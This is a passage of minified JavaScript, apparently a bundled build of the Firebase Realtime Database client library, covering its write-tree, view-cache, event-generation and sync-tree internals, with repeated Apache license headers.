 */class Ds{constructor(e,n,r){this.source=e,this.path=n,this.children=r,this.type=pt.MERGE}operationForChild(e){if(j(this.path)){const n=this.children.subtree(new q(e));return n.isEmpty()?null:n.value?new ur(this.source,H(),n.value):new Ds(this.source,H(),n)}else return S(M(this.path)===e,"Can't get a merge for a child not on the path of the operation"),new Ds(this.source,G(this.path),this.children)}toString(){return"Operation("+this.path+": "+this.source.toString()+" merge: "+this.children.toString()+")"}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class cr{constructor(e,n,r){this.node_=e,this.fullyInitialized_=n,this.filtered_=r}isFullyInitialized(){return this.fullyInitialized_}isFiltered(){return this.filtered_}isCompleteForPath(e){if(j(e))return this.isFullyInitialized()&&!this.filtered_;const n=M(e);return this.isCompleteForChild(n)}isCompleteForChild(e){return this.isFullyInitialized()&&!this.filtered_||this.node_.hasChild(e)}getNode(){return this.node_}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class f1{constructor(e){this.query_=e,this.index_=this.query_._queryParams.getIndex()}}function p1(t,e,n,r){const i=[],s=[];return e.forEach(o=>{o.type==="child_changed"&&t.index_.indexedValueChanged(o.oldSnap,o.snapshotNode)&&s.push(i1(o.childName,o.snapshotNode))}),Mi(t,i,"child_removed",e,r,n),Mi(t,i,"child_added",e,r,n),Mi(t,i,"child_moved",s,r,n),Mi(t,i,"child_changed",e,r,n),Mi(t,i,"value",e,r,n),i}function Mi(t,e,n,r,i,s){const o=r.filter(l=>l.type===n);o.sort((l,a)=>g1(t,l,a)),o.forEach(l=>{const a=m1(t,l,s);i.forEach(u=>{u.respondsTo(l.type)&&e.push(u.createEvent(a,t.query_))})})}function m1(t,e,n){return e.type==="value"||e.type==="child_removed"||(e.prevName=n.getPredecessorChildName(e.childName,e.snapshotNode,t.index_)),e}function g1(t,e,n){if(e.childName==null||n.childName==null)throw gi("Should only compare child_ events.");const r=new U(e.childName,e.snapshotNode),i=new U(n.childName,n.snapshotNode);return t.index_.compare(r,i)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function _a(t,e){return{eventCache:t,serverCache:e}}function rs(t,e,n,r){return _a(new cr(e,n,r),t.serverCache)}function Ny(t,e,n,r){return _a(t.eventCache,new cr(e,n,r))}function Pc(t){return t.eventCache.isFullyInitialized()?t.eventCache.getNode():null}function dr(t){return t.serverCache.isFullyInitialized()?t.serverCache.getNode():null}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let pu;const _1=()=>(pu||(pu=new He(nR)),pu);class Q{constructor(e,n=_1()){this.value=e,this.children=n}static fromObject(e){let n=new Q(null);return Ge(e,(r,i)=>{n=n.set(new q(r),i)}),n}isEmpty(){return this.value===null&&this.children.isEmpty()}findRootMostMatchingPathAndValue(e,n){if(this.value!=null&&n(this.value))return{path:H(),value:this.value};if(j(e))return null;{const r=M(e),i=this.children.get(r);if(i!==null){const s=i.findRootMostMatchingPathAndValue(G(e),n);return s!=null?{path:fe(new q(r),s.path),value:s.value}:null}else return null}}findRootMostValueAndPath(e){return this.findRootMostMatchingPathAndValue(e,()=>!0)}subtree(e){if(j(e))return this;{const n=M(e),r=this.children.get(n);return r!==null?r.subtree(G(e)):new Q(null)}}set(e,n){if(j(e))return new Q(n,this.children);{const r=M(e),s=(this.children.get(r)||new Q(null)).set(G(e),n),o=this.children.insert(r,s);return new Q(this.value,o)}}remove(e){if(j(e))return this.children.isEmpty()?new Q(null):new Q(null,this.children);{const n=M(e),r=this.children.get(n);if(r){const i=r.remove(G(e));let s;return i.isEmpty()?s=this.children.remove(n):s=this.children.insert(n,i),this.value===null&&s.isEmpty()?new Q(null):new Q(this.value,s)}else return this}}get(e){if(j(e))return this.value;{const n=M(e),r=this.children.get(n);return r?r.get(G(e)):null}}setTree(e,n){if(j(e))return n;{const r=M(e),s=(this.children.get(r)||new Q(null)).setTree(G(e),n);let o;return s.isEmpty()?o=this.children.remove(r):o=this.children.insert(r,s),new Q(this.value,o)}}fold(e){return this.fold_(H(),e)}fold_(e,n){const r={};return this.children.inorderTraversal((i,s)=>{r[i]=s.fold_(fe(e,i),n)}),n(e,this.value,r)}findOnPath(e,n){return this.findOnPath_(e,H(),n)}findOnPath_(e,n,r){const i=this.value?r(n,this.value):!1;if(i)return i;if(j(e))return null;{const s=M(e),o=this.children.get(s);return o?o.findOnPath_(G(e),fe(n,s),r):null}}foreachOnPath(e,n){return this.foreachOnPath_(e,H(),n)}foreachOnPath_(e,n,r){if(j(e))return this;{this.value&&r(n,this.value);const i=M(e),s=this.children.get(i);return s?s.foreachOnPath_(G(e),fe(n,i),r):new Q(null)}}foreach(e){this.foreach_(H(),e)}foreach_(e,n){this.children.inorderTraversal((r,i)=>{i.foreach_(fe(e,r),n)}),this.value&&n(e,this.value)}foreachChild(e){this.children.inorderTraversal((n,r)=>{r.value&&e(n,r.value)})}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vt{constructor(e){this.writeTree_=e}static empty(){return new vt(new Q(null))}}function is(t,e,n){if(j(e))return new vt(new Q(n));{const r=t.writeTree_.findRootMostValueAndPath(e);if(r!=null){const i=r.path;let s=r.value;const o=Be(i,e);return s=s.updateChild(o,n),new vt(t.writeTree_.set(i,s))}else{const i=new Q(n),s=t.writeTree_.setTree(e,i);return new vt(s)}}}function Zp(t,e,n){let r=t;return Ge(n,(i,s)=>{r=is(r,fe(e,i),s)}),r}function em(t,e){if(j(e))return vt.empty();{const n=t.writeTree_.setTree(e,new Q(null));return new vt(n)}}function xc(t,e){return wr(t,e)!=null}function wr(t,e){const n=t.writeTree_.findRootMostValueAndPath(e);return n!=null?t.writeTree_.get(n.path).getChild(Be(n.path,e)):null}function tm(t){const e=[],n=t.writeTree_.value;return n!=null?n.isLeafNode()||n.forEachChild(le,(r,i)=>{e.push(new U(r,i))}):t.writeTree_.children.inorderTraversal((r,i)=>{i.value!=null&&e.push(new U(r,i.value))}),e}function Tn(t,e){if(j(e))return t;{const n=wr(t,e);return n!=null?new vt(new Q(n)):new vt(t.writeTree_.subtree(e))}}function Ac(t){return t.writeTree_.isEmpty()}function ci(t,e){return Py(H(),t.writeTree_,e)}function Py(t,e,n){if(e.value!=null)return n.updateChild(t,e.value);{let r=null;return e.children.inorderTraversal((i,s)=>{i===".priority"?(S(s.value!==null,"Priority writes must always be leaf nodes"),r=s.value):n=Py(fe(t,i),s,n)}),!n.getChild(t).isEmpty()&&r!==null&&(n=n.updateChild(fe(t,".priority"),r)),n}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function fh(t,e){return by(e,t)}function v1(t,e,n,r,i){S(r>t.lastWriteId,"Stacking an older write on top of newer ones"),i===void 0&&(i=!0),t.allWrites.push({path:e,snap:n,writeId:r,visible:i}),i&&(t.visibleWrites=is(t.visibleWrites,e,n)),t.lastWriteId=r}function y1(t,e){for(let n=0;n<t.allWrites.length;n++){const r=t.allWrites[n];if(r.writeId===e)return r}return null}function w1(t,e){const n=t.allWrites.findIndex(l=>l.writeId===e);S(n>=0,"removeWrite called with nonexistent writeId.");const r=t.allWrites[n];t.allWrites.splice(n,1);let i=r.visible,s=!1,o=t.allWrites.length-1;for(;i&&o>=0;){const l=t.allWrites[o];l.visible&&(o>=n&&E1(l,r.path)?i=!1:ft(r.path,l.path)&&(s=!0)),o--}if(i){if(s)return C1(t),!0;if(r.snap)t.visibleWrites=em(t.visibleWrites,r.path);else{const l=r.children;Ge(l,a=>{t.visibleWrites=em(t.visibleWrites,fe(r.path,a))})}return!0}else return!1}function E1(t,e){if(t.snap)return ft(t.path,e);for(const n in t.children)if(t.children.hasOwnProperty(n)&&ft(fe(t.path,n),e))return!0;return!1}function C1(t){t.visibleWrites=xy(t.allWrites,S1,H()),t.allWrites.length>0?t.lastWriteId=t.allWrites[t.allWrites.length-1].writeId:t.lastWriteId=-1}function S1(t){return t.visible}function xy(t,e,n){let r=vt.empty();for(let i=0;i<t.length;++i){const s=t[i];if(e(s)){const o=s.path;let l;if(s.snap)ft(n,o)?(l=Be(n,o),r=is(r,l,s.snap)):ft(o,n)&&(l=Be(o,n),r=is(r,H(),s.snap.getChild(l)));else if(s.children){if(ft(n,o))l=Be(n,o),r=Zp(r,l,s.children);else if(ft(o,n))if(l=Be(o,n),j(l))r=Zp(r,H(),s.children);else{const a=li(s.children,M(l));if(a){const u=a.getChild(G(l));r=is(r,H(),u)}}}else throw gi("WriteRecord should have .snap or .children")}}return r}function Ay(t,e,n,r,i){if(!r&&!i){const s=wr(t.visibleWrites,e);if(s!=null)return s;{const o=Tn(t.visibleWrites,e);if(Ac(o))return n;if(n==null&&!xc(o,H()))return null;{const l=n||A.EMPTY_NODE;return ci(o,l)}}}else{const s=Tn(t.visibleWrites,e);if(!i&&Ac(s))return n;if(!i&&n==null&&!xc(s,H()))return null;{const o=function(u){return(u.visible||i)&&(!r||!~r.indexOf(u.writeId))&&(ft(u.path,e)||ft(e,u.path))},l=xy(t.allWrites,o,e),a=n||A.EMPTY_NODE;return ci(l,a)}}}function T1(t,e,n){let r=A.EMPTY_NODE;const i=wr(t.visibleWrites,e);if(i)return i.isLeafNode()||i.forEachChild(le,(s,o)=>{r=r.updateImmediateChild(s,o)}),r;if(n){const s=Tn(t.visibleWrites,e);return n.forEachChild(le,(o,l)=>{const a=ci(Tn(s,new q(o)),l);r=r.updateImmediateChild(o,a)}),tm(s).forEach(o=>{r=r.updateImmediateChild(o.name,o.node)}),r}else{const s=Tn(t.visibleWrites,e);return tm(s).forEach(o=>{r=r.updateImmediateChild(o.name,o.node)}),r}}function I1(t,e,n,r,i){S(r||i,"Either existingEventSnap or existingServerSnap must exist");const s=fe(e,n);if(xc(t.visibleWrites,s))return null;{const o=Tn(t.visibleWrites,s);return Ac(o)?i.getChild(n):ci(o,i.getChild(n))}}function k1(t,e,n,r){const i=fe(e,n),s=wr(t.visibleWrites,i);if(s!=null)return s;if(r.isCompleteForChild(n)){const o=Tn(t.visibleWrites,i);return ci(o,r.getNode().getImmediateChild(n))}else return null}function R1(t,e){return wr(t.visibleWrites,e)}function N1(t,e,n,r,i,s,o){let l;const a=Tn(t.visibleWrites,e),u=wr(a,H());if(u!=null)l=u;else if(n!=null)l=ci(a,n);else return[];if(l=l.withIndex(o),!l.isEmpty()&&!l.isLeafNode()){const c=[],d=o.getCompare(),h=s?l.getReverseIteratorFrom(r,o):l.getIteratorFrom(r,o);let m=h.getNext();for(;m&&c.length<i;)d(m,r)!==0&&c.push(m),m=h.getNext();return c}else return[]}function P1(){return{visibleWrites:vt.empty(),allWrites:[],lastWriteId:-1}}function Ul(t,e,n,r){return Ay(t.writeTree,t.treePath,e,n,r)}function ph(t,e){return T1(t.writeTree,t.treePath,e)}function nm(t,e,n,r){return I1(t.writeTree,t.treePath,e,n,r)}function Fl(t,e){return R1(t.writeTree,fe(t.treePath,e))}function x1(t,e,n,r,i,s){return N1(t.writeTree,t.treePath,e,n,r,i,s)}function mh(t,e,n){return k1(t.writeTree,t.treePath,e,n)}function Oy(t,e){return by(fe(t.treePath,e),t.writeTree)}function by(t,e){return{treePath:t,writeTree:e}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class A1{constructor(){this.changeMap=new Map}trackChildChange(e){const n=e.type,r=e.childName;S(n==="child_added"||n==="child_changed"||n==="child_removed","Only child changes supported for tracking"),S(r!==".priority","Only non-priority child changes can be tracked.");const i=this.changeMap.get(r);if(i){const s=i.type;if(n==="child_added"&&s==="child_removed")this.changeMap.set(r,Os(r,e.snapshotNode,i.snapshotNode));else if(n==="child_removed"&&s==="child_added")this.changeMap.delete(r);else if(n==="child_removed"&&s==="child_changed")this.changeMap.set(r,As(r,i.oldSnap));else if(n==="child_changed"&&s==="child_added")this.changeMap.set(r,ui(r,e.snapshotNode));else if(n==="child_changed"&&s==="child_changed")this.changeMap.set(r,Os(r,e.snapshotNode,i.oldSnap));else throw gi("Illegal combination of changes: "+e+" occurred after "+i)}else this.changeMap.set(r,e)}getChanges(){return Array.from(this.changeMap.values())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class O1{getCompleteChild(e){return null}getChildAfterChild(e,n,r){return null}}const Ly=new O1;class gh{constructor(e,n,r=null){this.writes_=e,this.viewCache_=n,this.optCompleteServerCache_=r}getCompleteChild(e){const n=this.viewCache_.eventCache;if(n.isCompleteForChild(e))return n.getNode().getImmediateChild(e);{const r=this.optCompleteServerCache_!=null?new cr(this.optCompleteServerCache_,!0,!1):this.viewCache_.serverCache;return mh(this.writes_,e,r)}}getChildAfterChild(e,n,r){const i=this.optCompleteServerCache_!=null?this.optCompleteServerCache_:dr(this.viewCache_),s=x1(this.writes_,i,n,1,r,e);return s.length===0?null:s[0]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function b1(t){return{filter:t}}function L1(t,e){S(e.eventCache.getNode().isIndexed(t.filter.getIndex()),"Event snap not indexed"),S(e.serverCache.getNode().isIndexed(t.filter.getIndex()),"Server snap not indexed")}function D1(t,e,n,r,i){const s=new A1;let o,l;if(n.type===pt.OVERWRITE){const u=n;u.source.fromUser?o=Oc(t,e,u.path,u.snap,r,i,s):(S(u.source.fromServer,"Unknown source."),l=u.source.tagged||e.serverCache.isFiltered()&&!j(u.path),o=jl(t,e,u.path,u.snap,r,i,l,s))}else if(n.type===pt.MERGE){const u=n;u.source.fromUser?o=U1(t,e,u.path,u.children,r,i,s):(S(u.source.fromServer,"Unknown source."),l=u.source.tagged||e.serverCache.isFiltered(),o=bc(t,e,u.path,u.children,r,i,l,s))}else if(n.type===pt.ACK_USER_WRITE){const u=n;u.revert?o=z1(t,e,u.path,r,i,s):o=F1(t,e,u.path,u.affectedTree,r,i,s)}else if(n.type===pt.LISTEN_COMPLETE)o=j1(t,e,n.path,r,s);else throw gi("Unknown operation type: "+n.type);const a=s.getChanges();return M1(e,o,a),{viewCache:o,changes:a}}function M1(t,e,n){const r=e.eventCache;if(r.isFullyInitialized()){const i=r.getNode().isLeafNode()||r.getNode().isEmpty(),s=Pc(t);(n.length>0||!t.eventCache.isFullyInitialized()||i&&!r.getNode().equals(s)||!r.getNode().getPriority().equals(s.getPriority()))&&n.push(Iy(Pc(e)))}}function Dy(t,e,n,r,i,s){const o=e.eventCache;if(Fl(r,n)!=null)return e;{let l,a;if(j(n))if(S(e.serverCache.isFullyInitialized(),"If change path is empty, we must have complete server data"),e.serverCache.isFiltered()){const u=dr(e),c=u instanceof A?u:A.EMPTY_NODE,d=ph(r,c);l=t.filter.updateFullNode(e.eventCache.getNode(),d,s)}else{const u=Ul(r,dr(e));l=t.filter.updateFullNode(e.eventCache.getNode(),u,s)}else{const u=M(n);if(u===".priority"){S(Nn(n)===1,"Can't have a priority with additional path components");const c=o.getNode();a=e.serverCache.getNode();const d=nm(r,n,c,a);d!=null?l=t.filter.updatePriority(c,d):l=o.getNode()}else{const c=G(n);let d;if(o.isCompleteForChild(u)){a=e.serverCache.getNode();const h=nm(r,n,o.getNode(),a);h!=null?d=o.getNode().getImmediateChild(u).updateChild(c,h):d=o.getNode().getImmediateChild(u)}else d=mh(r,u,e.serverCache);d!=null?l=t.filter.updateChild(o.getNode(),u,d,c,i,s):l=o.getNode()}}return rs(e,l,o.isFullyInitialized()||j(n),t.filter.filtersNodes())}}function jl(t,e,n,r,i,s,o,l){const a=e.serverCache;let u;const c=o?t.filter:t.filter.getIndexedFilter();if(j(n))u=c.updateFullNode(a.getNode(),r,null);else if(c.filtersNodes()&&!a.isFiltered()){const m=a.getNode().updateChild(n,r);u=c.updateFullNode(a.getNode(),m,null)}else{const m=M(n);if(!a.isCompleteForPath(n)&&Nn(n)>1)return e;const _=G(n),w=a.getNode().getImmediateChild(m).updateChild(_,r);m===".priority"?u=c.updatePriority(a.getNode(),w):u=c.updateChild(a.getNode(),m,w,_,Ly,null)}const d=Ny(e,u,a.isFullyInitialized()||j(n),c.filtersNodes()),h=new gh(i,d,s);return Dy(t,d,n,i,h,l)}function Oc(t,e,n,r,i,s,o){const l=e.eventCache;let a,u;const c=new gh(i,e,s);if(j(n))u=t.filter.updateFullNode(e.eventCache.getNode(),r,o),a=rs(e,u,!0,t.filter.filtersNodes());else{const d=M(n);if(d===".priority")u=t.filter.updatePriority(e.eventCache.getNode(),r),a=rs(e,u,l.isFullyInitialized(),l.isFiltered());else{const h=G(n),m=l.getNode().getImmediateChild(d);let _;if(j(h))_=r;else{const v=c.getCompleteChild(d);v!=null?gy(h)===".priority"&&v.getChild(vy(h)).isEmpty()?_=v:_=v.updateChild(h,r):_=A.EMPTY_NODE}if(m.equals(_))a=e;else{const v=t.filter.updateChild(l.getNode(),d,_,h,c,o);a=rs(e,v,l.isFullyInitialized(),t.filter.filtersNodes())}}}return a}function rm(t,e){return t.eventCache.isCompleteForChild(e)}function U1(t,e,n,r,i,s,o){let l=e;return r.foreach((a,u)=>{const c=fe(n,a);rm(e,M(c))&&(l=Oc(t,l,c,u,i,s,o))}),r.foreach((a,u)=>{const c=fe(n,a);rm(e,M(c))||(l=Oc(t,l,c,u,i,s,o))}),l}function im(t,e,n){return n.foreach((r,i)=>{e=e.updateChild(r,i)}),e}function bc(t,e,n,r,i,s,o,l){if(e.serverCache.getNode().isEmpty()&&!e.serverCache.isFullyInitialized())return e;let a=e,u;j(n)?u=r:u=new Q(null).setTree(n,r);const c=e.serverCache.getNode();return u.children.inorderTraversal((d,h)=>{if(c.hasChild(d)){const m=e.serverCache.getNode().getImmediateChild(d),_=im(t,m,h);a=jl(t,a,new q(d),_,i,s,o,l)}}),u.children.inorderTraversal((d,h)=>{const m=!e.serverCache.isCompleteForChild(d)&&h.value===null;if(!c.hasChild(d)&&!m){const _=e.serverCache.getNode().getImmediateChild(d),v=im(t,_,h);a=jl(t,a,new q(d),v,i,s,o,l)}}),a}function F1(t,e,n,r,i,s,o){if(Fl(i,n)!=null)return e;const l=e.serverCache.isFiltered(),a=e.serverCache;if(r.value!=null){if(j(n)&&a.isFullyInitialized()||a.isCompleteForPath(n))return jl(t,e,n,a.getNode().getChild(n),i,s,l,o);if(j(n)){let u=new Q(null);return a.getNode().forEachChild(Qr,(c,d)=>{u=u.set(new q(c),d)}),bc(t,e,n,u,i,s,l,o)}else return e}else{let u=new Q(null);return r.foreach((c,d)=>{const h=fe(n,c);a.isCompleteForPath(h)&&(u=u.set(c,a.getNode().getChild(h)))}),bc(t,e,n,u,i,s,l,o)}}function j1(t,e,n,r,i){const s=e.serverCache,o=Ny(e,s.getNode(),s.isFullyInitialized()||j(n),s.isFiltered());return Dy(t,o,n,r,Ly,i)}function z1(t,e,n,r,i,s){let o;if(Fl(r,n)!=null)return e;{const l=new gh(r,e,i),a=e.eventCache.getNode();let u;if(j(n)||M(n)===".priority"){let c;if(e.serverCache.isFullyInitialized())c=Ul(r,dr(e));else{const d=e.serverCache.getNode();S(d instanceof A,"serverChildren would be complete if leaf node"),c=ph(r,d)}c=c,u=t.filter.updateFullNode(a,c,s)}else{const c=M(n);let d=mh(r,c,e.serverCache);d==null&&e.serverCache.isCompleteForChild(c)&&(d=a.getImmediateChild(c)),d!=null?u=t.filter.updateChild(a,c,d,G(n),l,s):e.eventCache.getNode().hasChild(c)?u=t.filter.updateChild(a,c,A.EMPTY_NODE,G(n),l,s):u=a,u.isEmpty()&&e.serverCache.isFullyInitialized()&&(o=Ul(r,dr(e)),o.isLeafNode()&&(u=t.filter.updateFullNode(u,o,s)))}return o=e.serverCache.isFullyInitialized()||Fl(r,H())!=null,rs(e,u,o,t.filter.filtersNodes())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class B1{constructor(e,n){this.query_=e,this.eventRegistrations_=[];const r=this.query_._queryParams,i=new uh(r.getIndex()),s=o1(r);this.processor_=b1(s);const o=n.serverCache,l=n.eventCache,a=i.updateFullNode(A.EMPTY_NODE,o.getNode(),null),u=s.updateFullNode(A.EMPTY_NODE,l.getNode(),null),c=new cr(a,o.isFullyInitialized(),i.filtersNodes()),d=new cr(u,l.isFullyInitialized(),s.filtersNodes());this.viewCache_=_a(d,c),this.eventGenerator_=new f1(this.query_)}get query(){return this.query_}}function H1(t){return t.viewCache_.serverCache.getNode()}function W1(t,e){const n=dr(t.viewCache_);return n&&(t.query._queryParams.loadsAllData()||!j(e)&&!n.getImmediateChild(M(e)).isEmpty())?n.getChild(e):null}function sm(t){return t.eventRegistrations_.length===0}function $1(t,e){t.eventRegistrations_.push(e)}function om(t,e,n){const r=[];if(n){S(e==null,"A cancel should cancel all event registrations.");const i=t.query._path;t.eventRegistrations_.forEach(s=>{const o=s.createCancelEvent(n,i);o&&r.push(o)})}if(e){let i=[];for(let s=0;s<t.eventRegistrations_.length;++s){const o=t.eventRegistrations_[s];if(!o.matches(e))i.push(o);else if(e.hasAnyCallback()){i=i.concat(t.eventRegistrations_.slice(s+1));break}}t.eventRegistrations_=i}else t.eventRegistrations_=[];return r}function lm(t,e,n,r){e.type===pt.MERGE&&e.source.queryId!==null&&(S(dr(t.viewCache_),"We should always have a full cache before handling merges"),S(Pc(t.viewCache_),"Missing event cache, even though we have a server cache"));const i=t.viewCache_,s=D1(t.processor_,i,e,n,r);return L1(t.processor_,s.viewCache),S(s.viewCache.serverCache.isFullyInitialized()||!i.serverCache.isFullyInitialized(),"Once a server snap is complete, it should never go back"),t.viewCache_=s.viewCache,My(t,s.changes,s.viewCache.eventCache.getNode(),null)}function V1(t,e){const n=t.viewCache_.eventCache,r=[];return n.getNode().isLeafNode()||n.getNode().forEachChild(le,(s,o)=>{r.push(ui(s,o))}),n.isFullyInitialized()&&r.push(Iy(n.getNode())),My(t,r,n.getNode(),e)}function My(t,e,n,r){const i=r?[r]:t.eventRegistrations_;return p1(t.eventGenerator_,e,n,i)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let zl;class q1{constructor(){this.views=new Map}}function G1(t){S(!zl,"__referenceConstructor has already been defined"),zl=t}function K1(){return S(zl,"Reference.ts has not been loaded"),zl}function Y1(t){return t.views.size===0}function _h(t,e,n,r){const i=e.source.queryId;if(i!==null){const s=t.views.get(i);return S(s!=null,"SyncTree gave us an op for an invalid query."),lm(s,e,n,r)}else{let s=[];for(const o of t.views.values())s=s.concat(lm(o,e,n,r));return s}}function Q1(t,e,n,r,i){const s=e._queryIdentifier,o=t.views.get(s);if(!o){let l=Ul(n,i?r:null),a=!1;l?a=!0:r instanceof A?(l=ph(n,r),a=!1):(l=A.EMPTY_NODE,a=!1);const u=_a(new cr(l,a,!1),new cr(r,i,!1));return new B1(e,u)}return o}function X1(t,e,n,r,i,s){const o=Q1(t,e,r,i,s);return t.views.has(e._queryIdentifier)||t.views.set(e._queryIdentifier,o),$1(o,n),V1(o,n)}function J1(t,e,n,r){const i=e._queryIdentifier,s=[];let o=[];const l=Pn(t);if(i==="default")for(const[a,u]of t.views.entries())o=o.concat(om(u,n,r)),sm(u)&&(t.views.delete(a),u.query._queryParams.loadsAllData()||s.push(u.query));else{const a=t.views.get(i);a&&(o=o.concat(om(a,n,r)),sm(a)&&(t.views.delete(i),a.query._queryParams.loadsAllData()||s.push(a.query)))}return l&&!Pn(t)&&s.push(new(K1())(e._repo,e._path)),{removed:s,events:o}}function Uy(t){const e=[];for(const n of t.views.values())n.query._queryParams.loadsAllData()||e.push(n);return e}function Xr(t,e){let n=null;for(const r of t.views.values())n=n||W1(r,e);return n}function Fy(t,e){if(e._queryParams.loadsAllData())return va(t);{const r=e._queryIdentifier;return t.views.get(r)}}function jy(t,e){return Fy(t,e)!=null}function Pn(t){return va(t)!=null}function va(t){for(const e of t.views.values())if(e.query._queryParams.loadsAllData())return e;return null}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Bl;function Z1(t){S(!Bl,"__referenceConstructor has already been defined"),Bl=t}function eN(){return S(Bl,"Reference.ts has not been loaded"),Bl}let tN=1;class am{constructor(e){this.listenProvider_=e,this.syncPointTree_=new Q(null),this.pendingWriteTree_=P1(),this.tagToQueryMap=new Map,this.queryToTagMap=new Map}}function zy(t,e,n,r,i){return v1(t.pendingWriteTree_,e,n,r,i),i?eo(t,new ur(Ry(),e,n)):[]}function Vn(t,e,n=!1){const r=y1(t.pendingWriteTree_,e);if(w1(t.pendingWriteTree_,e)){let s=new Q(null);return r.snap!=null?s=s.set(H(),!0):Ge(r.children,o=>{s=s.set(new q(o),!0)}),eo(t,new Ml(r.path,s,n))}else return[]}function ya(t,e,n){return eo(t,new ur(dh(),e,n))}function nN(t,e,n){const r=Q.fromObject(n);return eo(t,new Ds(dh(),e,r))}function rN(t,e){return eo(t,new Ls(dh(),e))}function iN(t,e,n){const r=yh(t,n);if(r){const i=wh(r),s=i.path,o=i.queryId,l=Be(s,e),a=new Ls(hh(o),l);return Eh(t,s,a)}else return[]}function Lc(t,e,n,r,i=!1){const s=e._path,o=t.syncPointTree_.get(s);let l=[];if(o&&(e._queryIdentifier==="default"||jy(o,e))){const 